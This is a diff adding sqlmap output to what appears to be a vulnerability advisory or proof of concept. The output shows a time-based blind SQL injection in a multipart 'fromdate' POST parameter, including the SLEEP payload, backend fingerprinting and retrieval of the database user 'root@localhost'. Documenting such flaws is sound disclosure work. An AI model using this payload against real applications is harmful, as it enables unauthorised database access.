@@ -92,6 +92,45 @@ Content-Disposition: form-data; name="submit"
 ```
 
 
+```
+[15:46:54] [INFO] checking if the injection point on (custom) POST parameter 'MULTIPART fromdate' is a false positive
+(custom) POST parameter 'MULTIPART fromdate' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:
+---
+Parameter: MULTIPART fromdate ((custom) POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: ------WebKitFormBoundaryeUOXz9IJjNki6vAf
+Content-Disposition: form-data; name="fromdate"
+
+2025-09-15' AND (SELECT 8604 FROM (SELECT(SLEEP(5)))hlqc) AND 'yeTz'='yeTz
+------WebKitFormBoundaryeUOXz9IJjNki6vAf
+Content-Disposition: form-data; name="todate"
+
+2025-09-25
+------WebKitFormBoundaryeUOXz9IJjNki6vAf
+Content-Disposition: form-data; name="submit"
+
+
+------WebKitFormBoundaryeUOXz9IJjNki6vAf--
+---
+[15:47:10] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
+[15:47:10] [INFO] the back-end DBMS is MySQL
+[15:47:10] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+web application technology: PHP 8.1.13, Apache 2.4.54
+back-end DBMS: MySQL >= 5.0.12
+[15:47:10] [INFO] fetching current user
+multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] N
+[15:47:10] [INFO] retrieved: 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+[15:47:25] [INFO] adjusting time delay to 1 second due to good response times
+root@localhost
+current user: 'root@localhost'
+[15:48:20] [INFO] fetched data logged to text files under '/Users/kali/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 15:48:20 /2025-09-15/
+```
+	
 
 
 
